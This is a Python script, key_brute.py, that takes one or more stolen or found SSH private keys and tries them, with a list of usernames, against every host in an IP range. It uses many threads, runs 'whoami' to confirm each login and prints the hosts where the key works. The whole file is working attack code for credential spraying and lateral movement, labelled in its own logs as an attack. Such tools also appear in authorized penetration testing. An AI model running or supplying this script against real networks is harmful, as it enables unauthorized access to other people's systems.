import argparse
import ipaddress
import logging
import paramiko
from concurrent.futures import ThreadPoolExecutor

FORMAT = '%(levelname)s: %(asctime)s - %(message)s'
logging.disable(logging.ERROR)
logging.basicConfig(format=FORMAT, level=logging.INFO, datefmt='%m/%d/%Y %I:%M:%S %p')

usage = "python3 key_brute.py -iL 10.10.10.0/24 -f key1,key2 -u root,user1,user2 -t 20"

parser = argparse.ArgumentParser(
     description="Found a private key? Let's try to find the host it belongs to.",
     usage=usage
)

parser.add_argument(
     "-iL",
     dest="ip_list",
     action="store",
     required=True
)

parser.add_argument(
     "-f",
     dest="key_files",
     action="store",
     required=True
)

parser.add_argument(
     "-p",
     dest="port",
     action="store",
     default=22
)

parser.add_argument(
     "-u",
     dest="usernames",
     action="store"
)


parser.add_argument(
     "-t",
     dest="threads",
     action="store",
     default=10
)

def check_args(args):
     ip_list = [x for x in ipaddress.ip_network(args.ip_list, False)]
     port = args.port
     usernames = try_expand_arg(args.usernames)
     key_files = try_expand_arg(args.key_files)

     return ip_list, port, usernames, key_files

def print_successes(successes):
     if len(successes) > 0:
          print ("[!] Successful login attempts below! [!]")
          for success in successes:
               print("[-->] {}@{} - {}".format(
                    success['username'],
                    success['ip'] + ":" + str(success['port']),
                    success['key_file']
               ))               

def try_expand_arg(a):
     try:
          return [x for x in a.split(',')]
     except:
          return a

def try_ssh_connect(ip, port, username, key_file):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     logging.info('[+] Attempting: {}@{} using {}'.format(
                              username,
                              ip + ":" + str(port),
                              key_file
                         ))
     try:
          client.connect(
               ip,
               username=username,
               port=port,
               key_filename=key_file,
               timeout=5
          )

          stdin, stdout, stderr = client.exec_command("whoami")
          if stdout:
               logging.info("[!] SUCCESS! - {}@{} using {}".format(
                    username,
                    ip + ":" + str(port),
                    key_file
               ))
               successes.append({"ip": ip, "port": port, "username": username, "key_file": key_file})
     except Exception as e:
          # logging.error(e)
          return

if __name__ == "__main__":
     args = parser.parse_args()
     ip_list, port, usernames, key_files = check_args(args)
     successes = []
     logging.info("[*] Beginning attack...")
     with ThreadPoolExecutor(max_workers=int(args.threads)) as executor:
          for ip in ip_list:
               for username in usernames:
                    for key_file in key_files:
                         ip = str(ip)
                         if ip.split('.')[3] == "0":
                              continue
                         future = executor.submit(try_ssh_connect, ip, port, username, key_file)
     print_successes(successes)
